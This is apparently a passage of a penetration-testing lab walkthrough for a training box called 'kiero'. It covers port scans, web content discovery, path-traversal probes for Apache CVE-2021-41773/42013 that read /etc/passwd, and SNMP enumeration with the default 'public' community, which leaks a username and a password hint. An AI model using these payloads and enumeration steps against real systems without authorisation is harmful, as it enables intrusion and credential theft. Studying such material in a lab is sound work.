+<span class="w">    </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;^[0-9]+/tcp&quot;</span>
+<span class="k">done</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">=== 192.168.245.147 ===
+21/tcp   open   ftp
+22/tcp   open   ssh
+135/tcp  open   msrpc
+139/tcp  open   netbios-ssn
+445/tcp  open   microsoft-ds
+5985/tcp open   wsman
+8080/tcp open   http-proxy
+=== 192.168.245.150 ===
+22/tcp   open   ssh
+8080/tcp open   http-proxy
+=== 192.168.245.151 ===
+80/tcp   open     http
+3389/tcp open     ms-wbt-server</span></pre></div>
+<p><code>.147</code> is clearly Windows (RPC/SMB/WinRM); <code>.151</code> looks like Windows with a firewall dropping
+everything except HTTP and RDP. Recorded for later — not needed for this box.</p>
+<hr />
+<h3>Findings so far</h3>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Observation</th>
+<th>Weight</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>vsftpd 3.0.5 with (later confirmed) password auth</td>
+<td><strong>high</strong> — credentials are the weak point</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Apache 2.4.41 stock default page</td>
+<td>low — probably nothing deployed</td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>snmpd on UDP/161</strong></td>
+<td><strong>critical</strong> — unexplored, historically very leaky</td>
+</tr>
+<tr>
+<td>4</td>
+<td>No packet filter, RST on closed ports</td>
+<td>informational</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Single NIC, not a pivot</td>
+<td>informational</td>
+</tr>
+</tbody>
+</table>
+<p>Next: <a href="#ch-02">02 — Web enumeration</a>, where I confirm the obvious <code>80/tcp</code>
+candidate is a waste of time before spending more on it.</p>
+<p>Next actionable target: <strong>SNMP</strong>, chapter 03.</p></div></section>
+<section class="chapter" id="ch-02" data-title="Web enumeration"><div class="ch-head"><span class="ch-num">02</span><div class="ch-title"><h2>Web enumeration</h2><p class="ch-sub">The dead end, justified with four negatives</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Port 80 is the obvious target on a box with only three services, so it deserves a real attempt —
+but a bounded one. The skill being practised here is <strong>knowing when to stop</strong>, and being able to
+justify the stop with evidence rather than a hunch.</p>
+<p>Spoiler: there is nothing here. The value of this chapter is the four independent negative results,
+because together they justify walking away.</p>
+<hr />
+<h3>2.1 The root page</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://192.168.245.149/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-30
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">HTTP/1.1 200 OK
+Date: Sat, 14 Nov 2026 23:07:54 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Last-Modified: Mon, 21 Nov 2022 11:07:27 GMT
+ETag: "2aa6-5edf90f9272c6"
+Accept-Ranges: bytes
+Content-Length: 10918
+Vary: Accept-Encoding
+Content-Type: text/html</span></pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" ...&gt;
+&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
+  &lt;!--
+    Modified from the Debian original for Ubuntu
+    Last updated: 2016-11-16
+  --&gt;
+  &lt;head&gt;
+    &lt;title&gt;Apache2 Ubuntu Default Page: It works&lt;/title&gt;</span></pre></div>
+<p><strong>Reading it:</strong></p>
+<ul>
+<li><code>Content-Length: 10918</code> and the ETag <code>2aa6-5edf90f9272c6</code> match the stock Ubuntu
+  <code>index.html</code> byte-for-byte. This is the untouched package default, not a custom application.</li>
+<li><code>Last-Modified: Mon, 21 Nov 2022</code> — the document root was populated at the same time as the
+  box image was built (compare the FTP key timestamps later: also <code>Nov 21 2022</code>). Nothing has
+  been deployed since.</li>
+<li>A browser user-agent returns the same 10918 bytes, so there is no content negotiation or
+  mobile variant hiding something.</li>
+</ul>
+<h3>2.2 Cheap probes before brute force</h3>
+<p>Always do the short list first — it costs one loop and occasionally saves the whole chapter.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span>robots.txt<span class="w"> </span>sitemap.xml<span class="w"> </span>index.php<span class="w"> </span>index.html<span class="w"> </span>.git/<span class="w"> </span>.htaccess<span class="w"> </span><span class="se">\</span>
+<span class="w">         </span>server-status<span class="w"> </span>manual/<span class="w"> </span>phpinfo.php<span class="w"> </span>info.php<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="nv">code</span><span class="o">=</span><span class="k">$(</span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">&quot;%{http_code} %{size_download}&quot;</span><span class="w"> </span>--max-time<span class="w"> </span><span class="m">5</span><span class="w"> </span><span class="se">\</span>
+<span class="w">    </span><span class="s2">&quot;http://192.168.245.149/</span><span class="nv">$p</span><span class="s2">&quot;</span><span class="k">)</span>
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$code</span><span class="s2">  /</span><span class="nv">$p</span><span class="s2">&quot;</span>
+<span class="k">done</span>
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">404 277  /robots.txt
+404 277  /sitemap.xml
+404 277  /index.php
+200 10918  /index.html
+404 277  /.git/
+403 280  /.htaccess
+403 280  /server-status
+404 277  /manual/
+404 277  /phpinfo.php
+404 277  /info.php</span></pre></div>
+<p><strong>Reading it:</strong></p>
+<ul>
+<li>Every 404 returns the same <code>277</code> bytes — a consistent Apache error document, which gives us a
+  reliable size filter for the brute-force step.</li>
+<li>There is <strong>no PHP</strong>: <code>/index.php</code> 404s and <code>/phpinfo.php</code> 404s. Combined with
+  <code>Content-Type: text/html</code> on the index, this is a static-only Apache. No <code>mod_php</code>, so no
+  webshell path even after a file-write.</li>
+<li><code>.htaccess</code> → <code>403</code> means the file exists as a <em>protected</em> file rather than being served. Normal
+  hardening, not a finding.</li>
+<li><code>/server-status</code> → <code>403</code> means <code>mod_status</code> is loaded but restricted to localhost. Worth a note;
+  not exploitable from here.</li>
+</ul>
+<h3>2.3 Content discovery</h3>
+<p>Two wordlists, extensions included, generous thread count because the target is unthrottled.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://192.168.245.149<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--status-codes<span class="w"> </span><span class="m">200</span>,204,301,302,307,401,403<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--no-state<span class="w"> </span>-o<span class="w"> </span>ferox_raft.txt<span class="w"> </span>-q
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter
+200      GET       15l       74w     6147c http://192.168.245.149/icons/ubuntu-logo.png
+200      GET      375l      964w    10918c http://192.168.245.149/</span></pre></div>
+<p>Then the deeper pass, DirBuster 2.3 medium with common web extensions:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://192.168.245.149<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-x<span class="w"> </span>php,html,txt,bak,zip,tar.gz,old,conf,inc,sql<span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>--no-state<span class="w"> </span>-q<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-o<span class="w"> </span>/tmp/box149/ferox_deep.txt
+</pre></div>
+<p>Final result set after completion — three URLs total:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">200      GET       15l       74w     6147c http://192.168.245.149/icons/ubuntu-logo.png
+200      GET      375l      964w    10918c http://192.168.245.149/
+200      GET      375l      964w    10918c http://192.168.245.149/index.html</span></pre></div>
+<p><strong>Reading it:</strong> the only things that exist are the stock page and the stock icon. <code>--smart</code>
+auto-filtered the uniform 277-byte 404, so nothing is hidden behind soft-404 noise. This is as
+close to proof of "no web content" as you get without reading the docroot.</p>
+<h3>2.4 Virtual hosts</h3>
+<p>A default page on the IP does not rule out a named vhost with real content. Two resolutions
+(<code>Host: FUZZ</code> and <code>Host: FUZZ.local</code>), 5000-entry subdomain list, filtering the default page body.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ffuf<span class="w"> </span>-u<span class="w"> </span>http://192.168.245.149/<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Host: FUZZ&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-mc<span class="w"> </span>all<span class="w"> </span>-fr<span class="w"> </span><span class="s2">&quot;Apache2 Ubuntu Default Page&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-s
+</pre></div>
+<p>No hits. The same with <code>Host: FUZZ.local</code> also returned nothing.</p>
+<p><strong>Reading it:</strong> Apache is configured with a single default vhost. There is no second application
+reachable by hostname.</p>
+<h3>2.5 Scanner cross-check</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nikto<span class="w"> </span>-h<span class="w"> </span>http://192.168.245.149<span class="w"> </span>-nointeractive
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">+ Server: Apache/2.4.41 (Ubuntu)
++ [600050] Apache/2.4.41 appears to be outdated (current is at least 2.4.66).
++ [999984] /: Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5edf90f9272c6
++ [013587] /: Suggested security header missing: permissions-policy.
++ [013587] /: Suggested security header missing: x-content-type-options.
++ [013587] /: Suggested security header missing: referrer-policy.
++ [013587] /: Suggested security header missing: content-security-policy.
++ [013587] /: Suggested security header missing: strict-transport-security.
++ [999990] OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .</span></pre></div>
+<p><strong>Reading it:</strong> every item is generic hardening advice, not a vulnerability. Missing security
+headers on a static default page are noise. <code>OPTIONS/HEAD/GET/POST</code> is the Apache default method
+set — no dangerous methods like <code>PUT</code> or <code>DELETE</code>. <code>No CGI Directories found</code>, which matters for
+the next test.</p>
+<h3>2.6 Checking the one plausible CVE</h3>
+<p>Apache 2.4.41 is old. The famous 2021 path-traversal pair targets 2.4.49 and 2.4.50, so this is
+technically out of range — but Ubuntu backports, and the check is cheap. <code>--path-as-is</code> is
+<strong>mandatory</strong>: without it curl normalises <code>%2e%2e</code> for you and the test silently does nothing.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## CVE-2021-41773 via the icons alias</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://192.168.245.149/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd&quot;</span>
+
+<span class="c1">## CVE-2021-41773 via cgi-bin</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://192.168.245.149/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd&quot;</span>
+
+<span class="c1">## CVE-2021-42013 double-encoding variant</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span><span class="s2">&quot;http://192.168.245.149/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd&quot;</span>
+
+<span class="c1">## from the document root</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">&quot;http://192.168.245.149/.%2e/.%2e/.%2e/.%2e/etc/passwd&quot;</span>
+</pre></div>
+<p>All four:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;400 Bad Request&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Bad Request&lt;/h1&gt;</span></pre></div>
+<p><strong>Reading it:</strong> <code>400 Bad Request</code> rather than <code>403</code> or <code>404</code> is the patched behaviour. The
+<code>apache2-bin</code> package version recorded in the SNMP software list confirms it:
+<code>apache2_2.4.41-4ubuntu3.23_amd64</code> — the <code>3.23</code> revision includes the traversal fix backport.
+Also note <code>/cgi-bin/</code> 404s from section 2.2, so the alias this exploit depends on does not even
+exist.</p>
+<hr />
+<h3>Conclusion — do not spend more time on port 80</h3>
+<p>Four independent lines of evidence:</p>
+<ol>
+<li><strong>Byte-identical stock page</strong>, timestamped to image build time, no PHP and no redirects.</li>
+<li><strong>Two wordlists</strong> (raft-medium, DirBuster 2.3 medium with 10 extensions) → only the stock page
+   and stock icon; soft-404 filtered.</li>
+<li><strong>No vhosts</strong> across 5000 candidate names in two resolutions.</li>
+<li><strong>The only plausible CVE is patched</strong> (400, and the vulnerable package revision is confirmed
+   from the installed-software list).</li>
+</ol>
+<p>This is enough to write the service off and go where the evidence points: <strong>UDP/161 SNMP</strong>, which
+the TCP-only view never showed.</p>
+<p>→ <a href="#ch-03">03 — SNMP</a></p></div></section>
+<section class="chapter" id="ch-03" data-title="SNMP"><div class="ch-head"><span class="ch-num">03</span><div class="ch-title"><h2>SNMP</h2><p class="ch-sub">The leak that hands over credentials</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p><code>161/udp</code> was the only unambiguous UDP result from chapter 01. This chapter turns it into a
+username and a password policy statement.</p>
+<hr />
+<h3>3.1 Why SNMP first</h3>
+<p>SNMP on a Linux host is almost always <code>net-snmp</code>/<code>snmpd</code>, and it is almost always misconfigured in
+the same two ways on lab boxes: the default community string <code>public</code> is left in place, and
+somebody has added a custom <code>extend</code> entry that runs a host command. The <code>extend</code> mechanism is
+attractive for admins because it lets you expose arbitrary script output as an OID — and
+disastrous when the <em>description</em> of that extend is itself sensitive.</p>
+<h3>3.2 Finding the community string</h3>
+<p>Try the short default list before anything heavier.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;=== community: </span><span class="nv">$c</span><span class="s2"> ===&quot;</span>
+<span class="w">  </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">192</span>.168.245.149<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1
+<span class="k">done</span>
+</pre></div>
+<p><code>private</code>, <code>manager</code>, <code>internal</code> all returned <code>Timeout: No Response</code>. <code>public</code> replied:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">iso.3.6.1.2.1.1.1.0 = STRING: "Linux lab-pwk2-student-cl5-149-ubuntu1804-kiero-247-195 5.9.0-050900-generic #202010112230 SMP Sun Oct 11 22:34:01 UTC 2020 x86_64"
+iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
+iso.3.6.1.2.1.1.3.0 = Timeticks: (1330028) 3:41:40.28
+iso.3.6.1.2.1.1.4.0 = STRING: "Me &lt;me@example.org&gt;"
+iso.3.6.1.2.1.1.5.0 = STRING: "lab-pwk2-student-cl5-149-ubuntu1804-kiero-247-195"
+iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
+iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+iso.3.6.1.2.1.1.8.0 = Timeticks: (0) 0:00:00.00</span></pre></div>
+<p><strong>Reading it:</strong></p>
+<ul>
+<li>Community string is the default <code>public</code> — unauthenticated read access to the whole MIB tree.</li>
+<li><code>sysDescr</code> gives the kernel build (<code>#202010112230</code> — Oct 2020) and the FQDN.</li>
+<li>The hostname is <code>lab-pwk2-student-cl5-149-ubuntu1804-kiero-247-195</code>. Break it apart:
+  <code>kiero</code> is the box name, <code>ubuntu1804</code> the image, <code>cl5</code> the class/challenge. <strong>"kiero" is also a
+  username candidate</strong> — this is a naming habit worth noticing, since a username is half of a
+  credential.</li>
+<li><code>sysContact: Me &lt;me@example.org&gt;</code> and <code>sysLocation: Sitting on the Dock of the Bay</code> are
+  untouched package defaults, confirming snmpd was never hardened.</li>
+</ul>
+<h3>3.3 Enumerating the useful tables</h3>
+<p>Do not stop at <code>system</code>. On Linux, <code>1.3.6.1.2.1.25</code> (host resources) exposes the process table and
+the installed package list, which is effectively a free <code>ps</code> and <code>dpkg -l</code> without a shell.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## processes</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.245.149<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4.2.1.2<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;s/.*STRING: //&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u
+
+<span class="c1">## installed software</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.245.149<span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.6.3.1.2<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-E<span class="w"> </span><span class="s1">&#39;s/.*STRING: //&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u
+</pre></div>
+<p>Non-kernel processes:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">accounts-daemon
+agetty
+apache2
+atd
+cron
+dbus-daemon
+ModemManager
+multipathd
+networkd-dispat
+polkitd
+qemu-ga
+rsyslogd
+snapd
+snmpd
+sshd
+systemd
+systemd-journal
+systemd-logind
+systemd-network
+systemd-resolve
+systemd-timesyn
+systemd-udevd
+udisksd
+unattended-upgr
+upowerd
+uuidd
+vsftpd</span></pre></div>
+<p>Packages of interest:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">apache2_2.4.41-4ubuntu3.23_amd64
+openssh-server_1:8.2p1-4ubuntu0.13_amd64
+vsftpd_3.0.3-12_amd64
+snmpd_5.8+dfsg-2ubuntu2.5_amd64</span></pre></div>
+<p><strong>Reading it:</strong></p>
+<ul>
+<li><code>qemu-ga</code> confirms this is a VM on a hypervisor — consistent with a lab image.</li>
+<li><code>vsftpd_3.0.3-12</code> — note the <em>package</em> version differs from the banner <code>vsftpd 3.0.5</code>. The banner
+  reports the upstream release, the package reports the Ubuntu revision. Not a contradiction, but
+  worth knowing so you do not chase a phantom version mismatch.</li>
+<li><strong><code>apache2_2.4.41-4ubuntu3.23</code></strong> — the <code>3.23</code> revision is the backport containing the
+  CVE-2021-41773 fix. This independently confirms the 400 responses from chapter 02 and lets me
+  close that thread with evidence.</li>
+<li>No <code>docker</code>, no <code>mysql</code>, no <code>postgresql</code>, no unusual service — nothing else to pivot to locally.</li>
+</ul>
+<p>Process command lines (<code>1.3.6.1.2.1.25.4.2.1.5</code>) and paths (<code>...1.4</code>) mostly show stock argv, but
+one line matters:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">iso.3.6.1.2.1.25.4.2.1.5.5394 = STRING: "/etc/vsftpd.conf"</span></pre></div>
+<p>That is <code>vsftpd</code> started with an explicit config — normal, but it confirms FTP is configured
+deliberately rather than left at package defaults, which makes a non-default (i.e. weak,
+admin-set) credential more likely.</p>
+<h3>3.4 The extend table — the actual win</h3>
+<p>The UCD/net-snmp agent supports <code>extend</code> entries, which live under
+<code>1.3.6.1.4.1.8072.1.3.2</code> (<code>nsExtendTable</code>). Always walk this subtree; it is the single most
+valuable OID range on a Linux SNMP target.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.245.149<span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">iso.3.6.1.4.1.8072.1.3.2.1.0 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.2.1.2.5.82.69.83.69.84 = STRING: "./home/john/RESET_PASSWD"
+iso.3.6.1.4.1.8072.1.3.2.2.1.3.5.82.69.83.69.84 = ""
+iso.3.6.1.4.1.8072.1.3.2.2.1.4.5.82.69.83.69.84 = ""
+iso.3.6.1.4.1.8072.1.3.2.2.1.5.5.82.69.83.69.84 = INTEGER: 5
+iso.3.6.1.4.1.8072.1.3.2.2.1.6.5.82.69.83.69.84 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.2.1.7.5.82.69.83.69.84 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.2.1.20.5.82.69.83.69.84 = INTEGER: 4
+iso.3.6.1.4.1.8072.1.3.2.2.1.21.5.82.69.83.69.84 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.3.1.1.5.82.69.83.69.84 = STRING: "Resetting password of kiero to the default value"
+iso.3.6.1.4.1.8072.1.3.2.3.1.2.5.82.69.83.69.84 = STRING: "Resetting password of kiero to the default value"
+iso.3.6.1.4.1.8072.1.3.2.3.1.3.5.82.69.83.69.84 = INTEGER: 1
+iso.3.6.1.4.1.8072.1.3.2.3.1.4.5.82.69.83.69.84 = INTEGER: 0
+iso.3.6.1.4.1.8072.1.3.2.4.1.2.5.82.69.83.69.84.1 = STRING: "Resetting password of kiero to the default value"</span></pre></div>
+<h4>Decoding the index</h4>
+<p>The OID suffix <code>5.82.69.83.69.84</code> is not opaque. The first component is the string length, the
+rest are ASCII character codes:</p>
+<table>
+<thead>
+<tr>
+<th>Component</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>5</code></td>
+<td>length of the extend name</td>
+</tr>
+<tr>
+<td><code>82</code></td>
+<td><code>R</code></td>
+</tr>
+<tr>
+<td><code>69</code></td>
+<td><code>E</code></td>
+</tr>
+<tr>
+<td><code>83</code></td>
+<td><code>S</code></td>
+</tr>
+<tr>
+<td><code>69</code></td>
+<td><code>E</code></td>
+</tr>
+<tr>
+<td><code>84</code></td>
+<td><code>T</code></td>
+</tr>
+</tbody>
+</table>
+<p>So the extend is named <strong><code>RESET</code></strong>. Decoding these by hand is worth doing once — it makes tables
+where the <em>key</em> carries the meaning readable at a glance:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## generic decoder for an nsExtend index suffix</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;</span>
+<span class="s2">s=&#39;82.69.83.69.84&#39;.split(&#39;.&#39;)</span>
+<span class="s2">print(&#39;&#39;.join(chr(int(x)) for x in s[1:]))&quot;</span>
+</pre></div>
+<h4>What each column tells us</h4>
+<table>
+<thead>
+<tr>
+<th>Column</th>
+<th>Value</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>...2.1.2</code></td>
+<td><code>./home/john/RESET_PASSWD</code></td>
+<td>the command the agent executes</td>
+</tr>
+<tr>
+<td><code>...2.1.3</code> / <code>.4</code></td>
+<td><code>""</code></td>
+<td>no stdin, no arguments</td>
+</tr>
+<tr>
+<td><code>...2.1.5</code></td>
+<td><code>INTEGER: 5</code></td>
+<td>cache timeout type (5 = cache for a set period)</td>
+</tr>
+<tr>
+<td><code>...2.1.6</code></td>
+<td><code>INTEGER: 1</code></td>
+<td>output type: run the command through a shell</td>
+</tr>
+<tr>
+<td><code>...2.1.20</code> / <code>.21</code></td>
+<td><code>4</code>, <code>1</code></td>
+<td>exec error codes — clean run</td>
+</tr>
+<tr>
+<td><code>...3.1.1</code></td>
+<td><code>"Resetting password of kiero to the default value"</code></td>
+<td><strong>the MIB description string</strong></td>
+</tr>
+<tr>
+<td><code>...3.1.4</code></td>
+<td><code>INTEGER: 0</code></td>
+<td>exit status 0 — the command succeeded</td>
+</tr>
+</tbody>
+</table>
+<p>Three separate pieces of intelligence, all without credentials:</p>
+<ol>
+<li><strong>A username: <code>kiero</code>.</strong> Confirmed twice over — the description names it, and the hostname
+   <code>...-kiero-...</code> independently suggested it.</li>
+<li><strong>A password policy statement: "the default value".</strong> Not a hint, a specification. This
+   converts the password from "unknown, brute force everything" to "try the obvious defaults for
+   this specific account".</li>
+<li><strong>A privileged binary: <code>/home/john/RESET_PASSWD</code>.</strong> Something on this host exists whose job is
+   to reset <code>kiero</code>'s password, which means it runs as root. That is a privilege-escalation
+   candidate for later — logged and set aside for chapter 06.</li>
+</ol>
+<blockquote>
+<p><strong>Two-for-one.</strong> This single OID range supplied the entry point <em>and</em> foreshadowed the privesc.
+That is why <code>nsExtendTable</code> is always worth a walk.</p>
+</blockquote>
+<h4>A note on the extend output</h4>
+<p>The executed output (<code>...4.1.2.&lt;index&gt;.1</code>) contains only the description text, not a password. The
+cached value is what the script printed, and the script prints a status line. There is no
+credential to harvest <em>directly</em> from the extend — the value is purely the hint.</p>
+<p>Attempting to read the other output columns with <code>snmpget</code> returned <code>noSuchName</code>, which is correct
+behaviour: those columns only materialise for extends that emit multiple lines or explicit exit
+codes, and this one does not.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpget<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="m">192</span>.168.245.149<span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2.4.1.3.5.82.69.83.69.84
+<span class="c1">## Error in packet</span>
+##<span class="w"> </span>Reason:<span class="w"> </span><span class="o">(</span>noSuchName<span class="o">)</span><span class="w"> </span>There<span class="w"> </span>is<span class="w"> </span>no<span class="w"> </span>such<span class="w"> </span>variable<span class="w"> </span>name<span class="w"> </span><span class="k">in</span><span class="w"> </span>this<span class="w"> </span>MIB.
+</pre></div>
+<h3>3.5 Other community strings</h3>
+<p>Worth one pass to see whether a <em>write</em> community exists — <code>private</code> would allow <code>snmpget</code>-style
+<code>SET</code> requests and a completely different attack path. All failed:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>kiero<span class="w"> </span>oscp<span class="w"> </span>oscp.exam<span class="w"> </span>student<span class="w"> </span>cl5<span class="w"> </span>lab<span class="w"> </span>public2<span class="w"> </span>cisco<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;%-12s &quot;</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$c</span><span class="s2">&quot;</span>
